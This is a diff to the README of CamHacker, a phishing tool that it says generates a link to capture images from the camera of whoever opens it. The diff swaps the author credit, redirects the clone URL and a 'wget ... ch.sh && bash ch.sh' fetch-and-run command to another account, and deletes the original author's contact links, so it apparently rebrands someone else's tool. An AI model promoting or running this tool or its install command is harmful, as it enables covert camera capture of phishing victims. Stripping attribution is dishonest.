@@ -10,7 +10,7 @@
   <img src="https://img.shields.io/github/issues/KasRoudra/CamHacker?color=red&style=for-the-badge">
     <img src="https://img.shields.io/github/license/KasRoudra/CamHacker?style=for-the-badge&color=blue">
 <br>
-    <img src="https://img.shields.io/badge/Author-KasRoudra-green?style=flat-square">
+    <img src="https://img.shields.io/badge/Author-Pushy-green?style=flat-square">
     <img src="https://img.shields.io/badge/Open%20Source-Yes-orange?style=flat-square">
     <img src="https://img.shields.io/badge/Maintained-Yes-cyan?style=flat-square">
     <img src="https://img.shields.io/badge/Written%20In-Shell-blue?style=flat-square">
@@ -21,7 +21,7 @@ CamHacker is a phishing tool. It will generate a link. If anyone opens the link 
 
 ### [+] Installation
 
- - `git clone https://github.com/KasRoudra/CamHacker`
+ - `git clone https://github.com/dahlah270/CamHack`
  - `cd CamHacker`
 
 For termux, use additional command `termux-setup-storage`
@@ -29,7 +29,7 @@ For termux, use additional command `termux-setup-storage`
 
 ##### Or Run Directly
 ```
-wget https://raw.githubusercontent.com/KasRoudra/CamHacker/main/ch.sh && bash ch.sh
+wget https://raw.githubusercontent.com/dahlah270/CamHack/main/ch.sh && bash ch.sh
 ```
 
 ##### Usage
@@ -53,11 +53,6 @@ Options:
  - Choose where to save images(custom directory) 
  - Error Diagnoser
  - Argument support for templates, tunnelers and directory
-
-#### Relevant Tools by Me
- - [PyPhisher](https://github.com/KasRoudra/PyPhisher) for login phishing
- - [VidPhisher](https://github.com/KasRoudra/VidPhisher) for video phishing
-
  
 ### [+] Preview 
 ![Hack anyone's camera and get images](files/ch.gif)
@@ -78,9 +73,4 @@ Thanks to <a href="https://github.com/noob-hackers/grabcam">Noob-Hackers</a>, <a
 
 ### [+] Disclaimer 
 ***This tool is developed for educational purposes. Here it demonstrates how camera phishing works. If anybody wants to gain unauthorized access to someones camera, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of CamHacker!***
-
-### [+] Find me on 
-<a href="mailto:kasroudrakrd@gmail.com" target="_blank"><img src="https://img.shields.io/badge/Email-kasroudrakrd@gmail.com-blue?style=for-the-badge&logo=gmail"></a>
-
-<a href="https://m.me/KasRoudra" target="_blank"><img src="https://img.shields.io/badge/Messenger-KasRoudra-blue?style=for-the-badge&logo=messenger"></a>
 
